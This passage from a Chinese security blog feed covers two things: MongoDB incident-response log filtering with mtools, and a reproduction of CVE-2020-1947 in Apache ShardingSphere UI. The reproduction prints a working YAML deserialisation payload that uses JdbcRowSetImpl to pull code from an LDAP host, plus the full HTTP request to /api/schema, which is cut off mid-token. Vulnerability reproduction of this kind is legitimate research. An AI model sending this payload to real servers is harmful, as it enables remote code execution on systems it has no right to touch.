class="string">"Collection:"</span>, <span class="string">"&#123;"</span>, <span class="string">"acquireCount:"</span>, <span class="string">"&#123;"</span>, <span class="string">"w:"</span>, <span class="string">"27"</span>, <span class="string">"&#125;"</span>, <span class="string">"&#125;"</span>, <span class="string">"&#125;"</span>, <span class="string">"1126ms"</span>],</span><br><span class="line"><span class="attr">"datetime"</span>: <span class="string">"2020-05-10T14:23:33.371000+08:00"</span>,</span><br><span class="line"><span class="attr">"operation"</span>: <span class="string">"remove"</span>,</span><br><span class="line"><span class="attr">"thread"</span>: <span class="string">"conn134"</span>,</span><br><span class="line"><span class="attr">"namespace"</span>: <span class="string">"bookcircle.msgQueue"</span>,</span><br><span class="line"><span class="attr">"nscanned"</span>: <span class="number">219</span>,</span><br><span class="line"><span class="attr">"ndeleted"</span>: <span class="number">0</span>,</span><br><span class="line"><span class="attr">"duration"</span>: <span class="number">1126</span>,</span><br><span class="line"><span class="attr">"numYields"</span>: <span class="number">26</span></span><br><span class="line">&#125; &#123;</span><br><span class="line"><span class="attr">"line_str"</span>: <span class="string">"2020-05-24T10:18:24.305+0800 I WRITE [conn133] remove bookcircle.msgQueue command: &#123; q: &#123; receiver: \"5cca30682f29113ecdcc9230\", deviceId: \"imei860219041784179\", type: 21 &#125;, limit: 0 &#125; planSummary: IXSCAN &#123; receiver: 1 &#125; keysExamined:554 docsExamined:554 ndeleted:0 numYields:20 locks:&#123; Global: &#123; acquireCount: &#123; r: 21, w: 21 &#125; &#125;, Database: &#123; acquireCount: &#123; w: 21 &#125; &#125;, Collection: &#123; acquireCount: &#123; w: 21 &#125; &#125; &#125; 1036ms"</span>,</span><br><span class="line"><span class="attr">"split_tokens"</span>: [<span class="string">"2020-05-24T10:18:24.305+0800"</span>, <span class="string">"I"</span>, <span class="string">"WRITE"</span>, <span class="string">"[conn133]"</span>, <span class="string">"remove"</span>, <span class="string">"bookcircle.msgQueue"</span>, <span class="string">"command:"</span>, <span class="string">"&#123;"</span>, <span class="string">"q:"</span>, <span class="string">"&#123;"</span>, <span class="string">"receiver:"</span>, <span class="string">"\"5cca30682f29113ecdcc9230\","</span>, <span class="string">"deviceId:"</span>, <span class="string">"\"imei860219041784179\","</span>, <span class="string">"type:"</span>, <span class="string">"21"</span>, <span class="string">"&#125;,"</span>, <span class="string">"limit:"</span>, <span class="string">"0"</span>, <span class="string">"&#125;"</span>, <span class="string">"planSummary:"</span>, <span class="string">"IXSCAN"</span>, <span class="string">"&#123;"</span>, <span class="string">"receiver:"</span>, <span class="string">"1"</span>, <span class="string">"&#125;"</span>, <span class="string">"keysExamined:554"</span>, <span class="string">"docsExamined:554"</span>, <span class="string">"ndeleted:0"</span>, <span class="string">"numYields:20"</span>, <span class="string">"locks:&#123;"</span>, <span class="string">"Global:"</span>, <span class="string">"&#123;"</span>, <span class="string">"acquireCount:"</span>, <span class="string">"&#123;"</span>, <span class="string">"r:"</span>, <span class="string">"21,"</span>, <span class="string">"w:"</span>, <span class="string">"21"</span>, <span class="string">"&#125;"</span>, <span class="string">"&#125;,"</span>, <span class="string">"Database:"</span>, <span class="string">"&#123;"</span>, <span class="string">"acquireCount:"</span>, <span class="string">"&#123;"</span>, <span class="string">"w:"</span>, <span class="string">"21"</span>, <span class="string">"&#125;"</span>, <span class="string">"&#125;,"</span>, <span class="string">"Collection:"</span>, <span class="string">"&#123;"</span>, <span class="string">"acquireCount:"</span>, <span class="string">"&#123;"</span>, <span class="string">"w:"</span>, <span class="string">"21"</span>, <span class="string">"&#125;"</span>, <span class="string">"&#125;"</span>, <span class="string">"&#125;"</span>, <span class="string">"1036ms"</span>],</span><br><span class="line"><span class="attr">"datetime"</span>: <span class="string">"2020-05-24T10:18:24.305000+08:00"</span>,</span><br><span class="line"><span class="attr">"operation"</span>: <span class="string">"remove"</span>,</span><br><span class="line"><span class="attr">"thread"</span>: <span class="string">"conn133"</span>,</span><br><span class="line"><span class="attr">"namespace"</span>: <span class="string">"bookcircle.msgQueue"</span>,</span><br><span class="line"><span class="attr">"nscanned"</span>: <span class="number">554</span>,</span><br><span class="line"><span class="attr">"ndeleted"</span>: <span class="number">0</span>,</span><br><span class="line"><span class="attr">"duration"</span>: <span class="number">1036</span>,</span><br><span class="line"><span class="attr">"numYields"</span>: <span class="number">20</span></span><br><span class="line">&#125; &#123;</span><br><span class="line"><span class="attr">"line_str"</span>: <span class="string">"2020-05-27T11:45:22.932+0800 I WRITE [conn133] remove bookcircle.msgQueue command: &#123; q: &#123; receiver: \"5cca30682f29113ecdcc9230\", deviceId: \"imei860219041784179\", type: 21 &#125;, limit: 0 &#125; planSummary: IXSCAN &#123; receiver: 1 &#125; keysExamined:556 docsExamined:556 ndeleted:0 numYields:22 locks:&#123; Global: &#123; acquireCount: &#123; r: 23, w: 23 &#125; &#125;, Database: &#123; acquireCount: &#123; w: 23 &#125; &#125;, Collection: &#123; acquireCount: &#123; w: 23 &#125; &#125; &#125; 1147ms"</span>,</span><br><span class="line"><span class="attr">"split_tokens"</span>: [<span class="string">"2020-05-27T11:45:22.932+0800"</span>, <span class="string">"I"</span>, <span class="string">"WRITE"</span>, <span class="string">"[conn133]"</span>, <span class="string">"remove"</span>, <span class="string">"bookcircle.msgQueue"</span>, <span class="string">"command:"</span>, <span class="string">"&#123;"</span>, <span class="string">"q:"</span>, <span class="string">"&#123;"</span>, <span class="string">"receiver:"</span>, <span class="string">"\"5cca30682f29113ecdcc9230\","</span>, <span class="string">"deviceId:"</span>, <span class="string">"\"imei860219041784179\","</span>, <span class="string">"type:"</span>, <span class="string">"21"</span>, <span class="string">"&#125;,"</span>, <span class="string">"limit:"</span>, <span class="string">"0"</span>, <span class="string">"&#125;"</span>, <span class="string">"planSummary:"</span>, <span class="string">"IXSCAN"</span>, <span class="string">"&#123;"</span>, <span class="string">"receiver:"</span>, <span class="string">"1"</span>, <span class="string">"&#125;"</span>, <span class="string">"keysExamined:556"</span>, <span class="string">"docsExamined:556"</span>, <span class="string">"ndeleted:0"</span>, <span class="string">"numYields:22"</span>, <span class="string">"locks:&#123;"</span>, <span class="string">"Global:"</span>, <span class="string">"&#123;"</span>, <span class="string">"acquireCount:"</span>, <span class="string">"&#123;"</span>, <span class="string">"r:"</span>, <span class="string">"23,"</span>, <span class="string">"w:"</span>, <span class="string">"23"</span>, <span class="string">"&#125;"</span>, <span class="string">"&#125;,"</span>, <span class="string">"Database:"</span>, <span class="string">"&#123;"</span>, <span class="string">"acquireCount:"</span>, <span class="string">"&#123;"</span>, <span class="string">"w:"</span>, <span class="string">"23"</span>, <span class="string">"&#125;"</span>, <span class="string">"&#125;,"</span>, <span class="string">"Collection:"</span>, <span class="string">"&#123;"</span>, <span class="string">"acquireCount:"</span>, <span class="string">"&#123;"</span>, <span class="string">"w:"</span>, <span class="string">"23"</span>, <span class="string">"&#125;"</span>, <span class="string">"&#125;"</span>, <span class="string">"&#125;"</span>, <span class="string">"1147ms"</span>],</span><br><span class="line"><span class="attr">"datetime"</span>: <span class="string">"2020-05-27T11:45:22.932000+08:00"</span>,</span><br><span class="line"><span class="attr">"operation"</span>: <span class="string">"remove"</span>,</span><br><span class="line"><span class="attr">"thread"</span>: <span class="string">"conn133"</span>,</span><br><span class="line"><span class="attr">"namespace"</span>: <span class="string">"bookcircle.msgQueue"</span>,</span><br><span class="line"><span class="attr">"nscanned"</span>: <span class="number">556</span>,</span><br><span class="line"><span class="attr">"ndeleted"</span>: <span class="number">0</span>,</span><br><span class="line"><span class="attr">"duration"</span>: <span class="number">1147</span>,</span><br><span class="line"><span class="attr">"numYields"</span>: <span class="number">22</span></span><br><span class="line">&#125; &#123;</span><br><span class="line"><span class="attr">"line_str"</span>: <span class="string">"2020-05-29T08:56:47.903+0800 I WRITE [conn149] remove bookcircle.msgQueue command: &#123; q: &#123; receiver: \"5c9efb9b2f2911028436af98\", deviceId: \"imei860219041784179\", type: 21 &#125;, limit: 0 &#125; planSummary: IXSCAN &#123; receiver: 1 &#125; keysExamined:646 docsExamined:646 ndeleted:0 numYields:25 locks:&#123; Global: &#123; acquireCount: &#123; r: 26, w: 26 &#125; &#125;, Database: &#123; acquireCount: &#123; w: 26 &#125; &#125;, Collection: &#123; acquireCount: &#123; w: 26 &#125; &#125; &#125; 2300ms"</span>,</span><br><span class="line"><span class="attr">"split_tokens"</span>: [<span class="string">"2020-05-29T08:56:47.903+0800"</span>, <span class="string">"I"</span>, <span class="string">"WRITE"</span>, <span class="string">"[conn149]"</span>, <span class="string">"remove"</span>, <span class="string">"bookcircle.msgQueue"</span>, <span class="string">"command:"</span>, <span class="string">"&#123;"</span>, <span class="string">"q:"</span>, <span class="string">"&#123;"</span>, <span class="string">"receiver:"</span>, <span class="string">"\"5c9efb9b2f2911028436af98\","</span>, <span class="string">"deviceId:"</span>, <span class="string">"\"imei860219041784179\","</span>, <span class="string">"type:"</span>, <span class="string">"21"</span>, <span class="string">"&#125;,"</span>, <span class="string">"limit:"</span>, <span class="string">"0"</span>, <span class="string">"&#125;"</span>, <span class="string">"planSummary:"</span>, <span class="string">"IXSCAN"</span>, <span class="string">"&#123;"</span>, <span class="string">"receiver:"</span>, <span class="string">"1"</span>, <span class="string">"&#125;"</span>, <span class="string">"keysExamined:646"</span>, <span class="string">"docsExamined:646"</span>, <span class="string">"ndeleted:0"</span>, <span class="string">"numYields:25"</span>, <span class="string">"locks:&#123;"</span>, <span class="string">"Global:"</span>, <span class="string">"&#123;"</span>, <span class="string">"acquireCount:"</span>, <span class="string">"&#123;"</span>, <span class="string">"r:"</span>, <span class="string">"26,"</span>, <span class="string">"w:"</span>, <span class="string">"26"</span>, <span class="string">"&#125;"</span>, <span class="string">"&#125;,"</span>, <span class="string">"Database:"</span>, <span class="string">"&#123;"</span>, <span class="string">"acquireCount:"</span>, <span class="string">"&#123;"</span>, <span class="string">"w:"</span>, <span class="string">"26"</span>, <span class="string">"&#125;"</span>, <span class="string">"&#125;,"</span>, <span class="string">"Collection:"</span>, <span class="string">"&#123;"</span>, <span class="string">"acquireCount:"</span>, <span class="string">"&#123;"</span>, <span class="string">"w:"</span>, <span class="string">"26"</span>, <span class="string">"&#125;"</span>, <span class="string">"&#125;"</span>, <span class="string">"&#125;"</span>, <span class="string">"2300ms"</span>],</span><br><span class="line"><span class="attr">"datetime"</span>: <span class="string">"2020-05-29T08:56:47.903000+08:00"</span>,</span><br><span class="line"><span class="attr">"operation"</span>: <span class="string">"remove"</span>,</span><br><span class="line"><span class="attr">"thread"</span>: <span class="string">"conn149"</span>,</span><br><span class="line"><span class="attr">"namespace"</span>: <span class="string">"bookcircle.msgQueue"</span>,</span><br><span class="line"><span class="attr">"nscanned"</span>: <span class="number">646</span>,</span><br><span class="line"><span class="attr">"ndeleted"</span>: <span class="number">0</span>,</span><br><span class="line"><span class="attr">"duration"</span>: <span class="number">2300</span>,</span><br><span class="line"><span class="attr">"numYields"</span>: <span class="number">25</span></span><br><span class="line">&#125; &#123;</span><br><span class="line"><span class="attr">"line_str"</span>: <span class="string">"2020-05-30T09:23:31.244+0800 I WRITE [conn154] remove bookcircle.msgQueue command: &#123; q: &#123; receiver: \"5cca30682f29113ecdcc9230\", deviceId: \"imei860219041784179\", type: 21 &#125;, limit: 0 &#125; planSummary: IXSCAN &#123; receiver: 1 &#125; keysExamined:557 docsExamined:557 ndeleted:0 numYields:33 locks:&#123; Global: &#123; acquireCount: &#123; r: 34, w: 34 &#125; &#125;, Database: &#123; acquireCount: &#123; w: 34 &#125; &#125;, Collection: &#123; acquireCount: &#123; w: 34 &#125; &#125; &#125; 1939ms"</span>,</span><br><span class="line"><span class="attr">"split_tokens"</span>: [<span class="string">"2020-05-30T09:23:31.244+0800"</span>, <span class="string">"I"</span>, <span class="string">"WRITE"</span>, <span class="string">"[conn154]"</span>, <span class="string">"remove"</span>, <span class="string">"bookcircle.msgQueue"</span>, <span class="string">"command:"</span>, <span class="string">"&#123;"</span>, <span class="string">"q:"</span>, <span class="string">"&#123;"</span>, <span class="string">"receiver:"</span>, <span class="string">"\"5cca30682f29113ecdcc9230\","</span>, <span class="string">"deviceId:"</span>, <span class="string">"\"imei860219041784179\","</span>, <span class="string">"type:"</span>, <span class="string">"21"</span>, <span class="string">"&#125;,"</span>, <span class="string">"limit:"</span>, <span class="string">"0"</span>, <span class="string">"&#125;"</span>, <span class="string">"planSummary:"</span>, <span class="string">"IXSCAN"</span>, <span class="string">"&#123;"</span>, <span class="string">"receiver:"</span>, <span class="string">"1"</span>, <span class="string">"&#125;"</span>, <span class="string">"keysExamined:557"</span>, <span class="string">"docsExamined:557"</span>, <span class="string">"ndeleted:0"</span>, <span class="string">"numYields:33"</span>, <span class="string">"locks:&#123;"</span>, <span class="string">"Global:"</span>, <span class="string">"&#123;"</span>, <span class="string">"acquireCount:"</span>, <span class="string">"&#123;"</span>, <span class="string">"r:"</span>, <span class="string">"34,"</span>, <span class="string">"w:"</span>, <span class="string">"34"</span>, <span class="string">"&#125;"</span>, <span class="string">"&#125;,"</span>, <span class="string">"Database:"</span>, <span class="string">"&#123;"</span>, <span class="string">"acquireCount:"</span>, <span class="string">"&#123;"</span>, <span class="string">"w:"</span>, <span class="string">"34"</span>, <span class="string">"&#125;"</span>, <span class="string">"&#125;,"</span>, <span class="string">"Collection:"</span>, <span class="string">"&#123;"</span>, <span class="string">"acquireCount:"</span>, <span class="string">"&#123;"</span>, <span class="string">"w:"</span>, <span class="string">"34"</span>, <span class="string">"&#125;"</span>, <span class="string">"&#125;"</span>, <span class="string">"&#125;"</span>, <span class="string">"1939ms"</span>],</span><br><span class="line"><span class="attr">"datetime"</span>: <span class="string">"2020-05-30T09:23:31.244000+08:00"</span>,</span><br><span class="line"><span class="attr">"operation"</span>: <span class="string">"remove"</span>,</span><br><span class="line"><span class="attr">"thread"</span>: <span class="string">"conn154"</span>,</span><br><span class="line"><span class="attr">"namespace"</span>: <span class="string">"bookcircle.msgQueue"</span>,</span><br><span class="line"><span class="attr">"nscanned"</span>: <span class="number">557</span>,</span><br><span class="line"><span class="attr">"ndeleted"</span>: <span class="number">0</span>,</span><br><span class="line"><span class="attr">"duration"</span>: <span class="number">1939</span>,</span><br><span class="line"><span class="attr">"numYields"</span>: <span class="number">33</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据关键字过滤日志</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mlogfilter mongod.log --word assert warning error</span><br></pre></td></tr></table></figure><p>根据匹配条件查询日志</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mlogfilter mongod.log --pattern &apos;&#123;&quot;_id&quot;: 1, &quot;host&quot;: 1, &quot;ns&quot;: 1&#125;</span><br></pre></td></tr></table></figure><p>这工具其实很强大，还有很多操作你们可以去研究看看，windows还有个logparse，一个轻量强大日志分析工具其实在应急过程中很常用</p>]]></content>
    
    <summary type="html">
    
      今天应急过程中，客户mongodb数据库被删了，原因是mongo未授权，需要溯源攻击者IP，数据库是什么时候被删的，以什么权限被删的，哪个用户
    
    </summary>
    
    
      <category term="mongodb" scheme="https://hexchristmas.github.io/tags/mongodb/"/>
    
      <category term="应急响应" scheme="https://hexchristmas.github.io/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2020-1947_ApacheShardingShpereUIYAML解析远程代码执行漏洞复现及分析</title>
    <link href="https://hexchristmas.github.io/p/17c.html"/>
    <id>https://hexchristmas.github.io/p/17c.html</id>
    <published>2020-05-29T17:37:51.000Z</published>
    <updated>2020-06-09T07:27:33.000Z</updated>
    
    <content type="html"><![CDATA[<h1>CVE-2020-1947 ApacheShardingShpereUIYAML解析远程代码执行漏洞复现及分析</h1><h2 id="概述">概述</h2><p>shardingsphere是apache的一套开源生态系统，是一组分布式数据库中间件解决方案，是由sharding-jdbc、sharding-proxy和sharding-sidecar三款相互独立的框架组成，被用来提供数据分片，分布式事务，数据库治理</p><h2 id="受影响版本">受影响版本</h2><p>ShardingSphere 4.0.0-RC3, 4.0.0　<br>sharding-jdbc,sharding-proxy,sharding-ui等组件</p><h2 id="分析环境">分析环境</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Apache-shardingsphere-incubating-4.0.0</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">java version &quot;1.8.0_231&quot;</span><br><span class="line">Java(TM) SE Runtime Environment (build 1.8.0_231-b11)</span><br><span class="line">Java HotSpot(TM) 64-Bit Server VM (build 25.231-b11, mixed mode</span><br></pre></td></tr></table></figure><h2 id="漏洞分析">漏洞分析</h2><p>shardingsphere的web控制台使用snakeyaml库进行解析yaml输入以加载数据源配置,snakeyaml允许unmarshal在不而被校验就可以进行解析并进行反序列化，<br><img src="https://raw.githubusercontent.com/HexChristmas/CVE-2020-1947/master/img/11.png" alt><br>unmarshal()直接将内容传入yaml.snakeyaml的load()解析<br><img src="https://raw.githubusercontent.com/HexChristmas/CVE-2020-1947/master/img/12.png" alt><br>此时unmarshal传要一个恶意yaml序列化内容就会导致RCE</p><h2 id="漏洞复现">漏洞复现</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/HexChristmas/CVE-2020-1947</span><br><span class="line">cd CVE-2020-1947</span><br><span class="line">docker-compose.yml</span><br></pre></td></tr></table></figure><p>Poc</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;name&quot;:&quot;CVE-2020-1947&quot;,&quot;ruleConfiguration&quot;:&quot;  encryptors:\n    encryptor_aes:\n      type: aes\n      props:\n        aes.key.value: 123456abc\n    encryptor_md5:\n      type: md5\n  tables:\n    t_encrypt:\n      columns:\n        user_id:\n          plainColumn: user_plain\n          cipherColumn: user_cipher\n          encryptor: encryptor_aes\n        order_id:\n          cipherColumn: order_cipher\n          encryptor: encryptor_md5&quot;,&quot;dataSourceConfiguration&quot;:&quot;!!com.sun.rowset.JdbcRowSetImpl\n  dataSourceName: ldap://127.0.0.1:1389/CommandObject\n  autoCommit: true&quot;&#125;</span><br></pre></td></tr></table></figure><p>Request</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST /api/schema HTTP/1.1</span><br><span class="line">Host: 10.10.20.166:8089</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0</span><br><span class="line">Accept: application/json, text/plain, */*</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/json;charset=utf-8</span><br><span class="line">Access-Token: eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiJhZG1pbiIsImJhc2U2NCI6eyJlbmNvZGVUYWJsZSI6WzY1LDY2LDY3LDY4LDY5LDcwLDcxLDcyLDczLDc0LDc1LDc2LDc3LDc4LDc5LDgwLDgxLDgyLDgzLDg0LDg1LDg2LDg3LDg4LDg5LDkwLDk3LDk4LDk5LDEwMCwxMDEsMTAyLDEwMywxMDQsMTA1LDEwNiwxMDcsMTA4LDEwOSwxMTAsMTExLDExMiwxMTMsMTE0LDExNSwxMTYsMTE3LDExOCwxMTksMTIwLDEyMSwxMjIsNDgsNDksNTAsNTEsNTIsNTMsNTQsNTUsNTYsNTcsNDMsNDddLCJkZWNvZGVUYWJsZSI6Wy0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLDYyLC0xLDYyLC0xLDYzLDUyLDUzLDU0LDU1LDU2LDU3LDU4LDU5LDYwLDYxLC0xLC0xLC0xLC0xLC0xLC0xLC0xLDAsMSwyLDMsNCw1LDYsNyw4LDksMTAsMTEsMTIsMTMsMTQsMTUsMTYsMTcsMTgsMTksMjAsMjEsMjIsMjMsMjQsMjUsLTEsLTEsLTEsLTEsNjMsLTEsMjYsMjcsMjgsMjksMzAsMzEsMzIsMzMsMzQsMzUsMzYsMzcsMzgsMzksNDAsNDEsNDIsNDMsNDQsNDUsNDYsNDcsNDgsNDksNTAsNTFdLCJkZWNvZGVTaXplIjozLCJlbmNvZGVTaXplIjo0LCJQQUQiOjYxLCJwYWQiOjYxLCJ1bmVuY29kZWRCbG9ja1NpemUiOjMsImVuY29kZWRCbG9ja1NpemUiOjQsImxpbmVMZW5ndGgiOjAsImNodW5rU2VwYXJhdG9yTGVuZ3RoIjoyfSwiZ3NvbiI6eyJjYWxscyI6eyJ0aHJlYWRMb2NhbEhhc2hDb2RlIjoxMzk4MDMyNzAxfSwidHlwZVRva2VuQ2FjaGUiOnsiamF2YS5sYW5nLkRvdWJsZSI6e30sImphdmEudXRpbC5NYXBcdTAwM2Njb20uZ29vZ2xlLmdzb24ucmVmbGVjdC5UeXBlVG9rZW5cdTAwM2M/XHUwMDNlLCBjb20uZ29vZ2xlLmdzb24uVHlwZUFkYXB0ZXJcdTAwM2M/XHUwMDNlXHUwMDNlIjp7fSwiY29tLmdvb2dsZS5nc29uLmludGVybmFsLnJlZmxlY3QuUmVmbGVjdGlvbkFjY2Vzc29yIjp7fSwiY29tLmdvb2dsZS5nc29uLmludGVybmFsLmJpbmQuT2JqZWN0VHlwZUFkYXB0ZXIkMSI6e30sImNvbS5nb29nbGUuZ3Nvbi5Mb25nU2VyaWFsaXphdGlvblBvbGljeSI6e30sImNvbS5nb29nbGUuZ3Nvbi5UeXBlQWRhcHRlclx1MDAzYz9cdTAwM2UiOnt9LCJqYXZhLmxhbmcuQ2xhc3NcdTAwM2M/XHUwMDNlIjp7fSwiamF2YS5sYW5nLlN0cmluZyI6e30sImphdmEubGFuZy5Cb29sZWFuIjp7fSwiY29tLmdvb2dsZS5nc29uLmludGVybmFsLmJpbmQuVHlwZUFkYXB0ZXJzJDMwIjp7fSwiY29tLmdvb2dsZS5nc29uLkZpZWxkTmFtaW5nUG9saWN5JDEiOnt9LCJvcmcuYXBhY2hlLmNvbW1vbnMuY29kZWMuYmluYXJ5LkJhc2U2NCI6e30sImNvbS5nb29nbGUuZ3Nvbi5Mb25nU2VyaWFsaXphdGlvblBvbGljeSQxIjp7fSwiY29tLmdvb2dsZS5nc29uLnJlZmxlY3QuVHlwZVRva2VuXHUwMDNjP1x1MDAzZSI6e30sImNvbS5nb29nbGUuZ3Nvbi5pbnRlcm5hbC5iaW5kLlRpbWVUeXBlQWRhcHRlciQxIjp7fSwiamF2YS5sYW5nLnJlZmxlY3QuVHlwZSI6e30sImphdmEudXRpbC5MaXN0XHUwMDNjY29tLmdvb2dsZS5nc29uLlR5cGVBZGFwdGVyRmFjdG9yeVx1MDAzZSI6e30sImphdmEubGFuZy5CeXRlIjp7fSwiamF2YS5sYW5nLkludGVnZXIiOnt9LCJjb20uZ29vZ2xlLmdzb24uaW50ZXJuYWwuYmluZC5TcWxEYXRlVHlwZUFkYXB0ZXIkMSI6e30sImNvbS5nb29nbGUuZ3Nvbi5pbnRlcm5hbC5iaW5kLkpzb25BZGFwdGVyQW5ub3RhdGlvblR5cGVBZGFwdGVyRmFjdG9yeSI6e30sImNvbS5nb29nbGUuZ3Nvbi5pbnRlcm5hbC5iaW5kLk1hcFR5cGVBZGFwdGVyRmFjdG9yeSI6e30sImJ5dGUiOnt9LCJieXRlW10iOnt9LCJjb20uZ29vZ2xlLmdzb24uaW50ZXJuYWwuYmluZC5UeXBlQWRhcHRlcnMkMzQiOnt9LCJjb20uZ29vZ2xlLmdzb24uSW5zdGFuY2VDcmVhdG9yXHUwMDNjP1x1MDAzZSI6e30sIm9yZy5hcGFjaGUuc2hhcmRpbmdzcGhlcmUudWkuc2VjdXJpdHkuVXNlckF1dGhlbnRpY2F0aW9uU2VydmljZSI6e30sImNvbS5nb29nbGUuZ3Nvbi5pbnRlcm5hbC5iaW5kLlJlZmxlY3RpdmVUeXBlQWRhcHRlckZhY3RvcnkiOnt9LCJqYXZhLnV0aWwuTWFwXHUwMDNjamF2YS5sYW5nLnJlZmxlY3QuVHlwZSwgY29tLmdvb2dsZS5nc29uLkluc3RhbmNlQ3JlYXRvclx1MDAzYz9cdTAwM2VcdTAwM2UiOnt9LCJqYXZhLmxhbmcuVGhyZWFkTG9jYWxcdTAwM2NqYXZhLnV0aWwuTWFwXHUwMDNjY29tLmdvb2dsZS5nc29uLnJlZmxlY3QuVHlwZVRva2VuXHUwMDNjP1x1MDAzZSwgY29tLmdvb2dsZS5nc29uLkdzb24kRnV0dXJlVHlwZUFkYXB0ZXJcdTAwM2M/XHUwMDNlXHUwMDNlXHUwMDNlIjp7fSwiY29tLmdvb2dsZS5nc29uLkdzb24iOnt9LCJjb20uZ29vZ2xlLmdzb24uaW50ZXJuYWwuYmluZC5UeXBlQWRhcHRlcnMkMzIiOnt9LCJjb20uZ29vZ2xlLmdzb24uaW50ZXJuYWwuYmluZC5UeXBlQWRhcHRlcnMkMzUiOnt9LCJjb20uZ29vZ2xlLmdzb24uaW50ZXJuYWwuQ29uc3RydWN0b3JDb25zdHJ1Y3RvciI6e30sImJvb2xlYW4iOnt9LCJjb20uZ29vZ2xlLmdzb24uaW50ZXJuYWwuYmluZC5EYXRlVHlwZUFkYXB0ZXIkMSI6e30sImphdmEudXRpbC5MaXN0XHUwMDNjY29tLmdvb2dsZS5nc29uLkV4Y2x1c2lvblN0cmF0ZWd5XHUwMDNlIjp7fSwiY29tLmdvb2dsZS5nc29uLlR5cGVBZGFwdGVyRmFjdG9yeSI6e30sImludCI6e30sImNvbS5nb29nbGUuZ3Nvbi5GaWVsZE5hbWluZ1N0cmF0ZWd5Ijp7fSwiY29tLmdvb2dsZS5nc29uLmludGVybmFsLmJpbmQuVHlwZUFkYXB0ZXJzJDMzIjp7fSwiY29tLmdvb2dsZS5nc29uLkV4Y2x1c2lvblN0cmF0ZWd5Ijp7fSwiY29tLmdvb2dsZS5nc29uLmludGVybmFsLmJpbmQuQXJyYXlUeXBlQWRhcHRlciQxIjp7fSwiZG91YmxlIjp7fSwiY29tLmdvb2dsZS5nc29uLmludGVybmFsLnJlZmxlY3QuUHJlSmF2YTlSZWZsZWN0aW9uQWNjZXNzb3IiOnt9LCJjb20uZ29vZ2xlLmdzb24uaW50ZXJuYWwuRXhjbHVkZXIiOnt9LCJjb20uZ29vZ2xlLmdzb24uaW50ZXJuYWwuYmluZC5UeXBlQWRhcHRlcnMkMjYiOnt9LCJjb20uZ29vZ2xlLmdzb24uaW50ZXJuYWwuYmluZC5Db2xsZWN0aW9uVHlwZUFkYXB0ZXJGYWN0b3J5Ijp7fX0sImNvbnN0cnVjdG9yQ29uc3RydWN0b3IiOnsiaW5zdGFuY2VDcmVhdG9ycyI6e30sImFjY2Vzc29yIjp7fX0sImpzb25BZGFwdGVyRmFjdG9yeSI6eyJjb25zdHJ1Y3RvckNvbnN0cnVjdG9yIjp7Imluc3RhbmNlQ3JlYXRvcnMiOnt9LCJhY2Nlc3NvciI6e319fSwiZmFjdG9yaWVzIjpbbnVsbCxudWxsLHsidmVyc2lvbiI6LTEuMCwibW9kaWZpZXJzIjoxMzYsInNlcmlhbGl6ZUlubmVyQ2xhc3NlcyI6dHJ1ZSwicmVxdWlyZUV4cG9zZSI6ZmFsc2UsInNlcmlhbGl6YXRpb25TdHJhdGVnaWVzIjpbXSwiZGVzZXJpYWxpemF0aW9uU3RyYXRlZ2llcyI6W119LG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLHsiY29uc3RydWN0b3JDb25zdHJ1Y3RvciI6eyJpbnN0YW5jZUNyZWF0b3JzIjp7fSwiYWNjZXNzb3IiOnt9fX0seyJjb25zdHJ1Y3RvckNvbnN0cnVjdG9yIjp7Imluc3RhbmNlQ3JlYXRvcnMiOnt9LCJhY2Nlc3NvciI6e319LCJjb21wbGV4TWFwS2V5U2VyaWFsaXphdGlvbiI6ZmFsc2V9LHsiY29uc3RydWN0b3JDb25zdHJ1Y3RvciI6eyJpbnN0YW5jZUNyZWF0b3JzIjp7fSwiYWNjZXNzb3IiOnt9fX0sbnVsbCx7ImNvbnN0cnVjdG9yQ29uc3RydWN0b3IiOnsiaW5zdGFuY2VDcmVhdG9ycyI6e30sImFjY2Vzc29yIjp7fX0sImZpZWxkTmFtaW5nUG9saWN5IjoiSURFTlRJVFkiLCJleGNsdWRlciI6eyJ2ZXJzaW9uIjotMS4wLCJtb2RpZmllcnMiO